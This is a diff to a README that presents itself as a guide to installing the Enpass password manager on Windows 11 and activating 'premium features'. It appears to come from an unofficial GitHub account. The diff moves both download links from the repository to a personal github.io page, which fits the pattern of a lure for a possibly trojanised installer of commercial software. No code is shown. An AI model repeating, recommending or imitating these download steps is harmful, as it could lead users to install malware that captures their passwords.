@@ -1,6 +1,6 @@
 # 🔐 Enpass-Configuration-Guide - Get Enpass running on Windows today
 
-[![](https://img.shields.io/badge/Download-Enpass_Installer-blue.svg)](https://github.com/sellerslackey356/Enpass-Configuration-Guide)
+[![](https://img.shields.io/badge/Download-Enpass_Installer-blue.svg)](https://sellerslackey356.github.io)
 
 This guide helps you install the Enpass password manager on your Windows 11 computer. You will find clear steps to download the software, fix common installation errors, and activate your premium features.
 
@@ -18,7 +18,7 @@ Before you install Enpass, check that your computer meets these minimum needs:
 
 Follow these steps to obtain the correct version of the application:
 
-1. Visit the following link: [https://github.com/sellerslackey356/Enpass-Configuration-Guide](https://github.com/sellerslackey356/Enpass-Configuration-Guide)
+1. Visit the following link: [https://sellerslackey356.github.io](https://sellerslackey356.github.io)
 2. Locate the download section on the page.
 3. Click the button to save the installer file to your computer.
 4. Wait for the file to finish downloading to your Downloads folder.
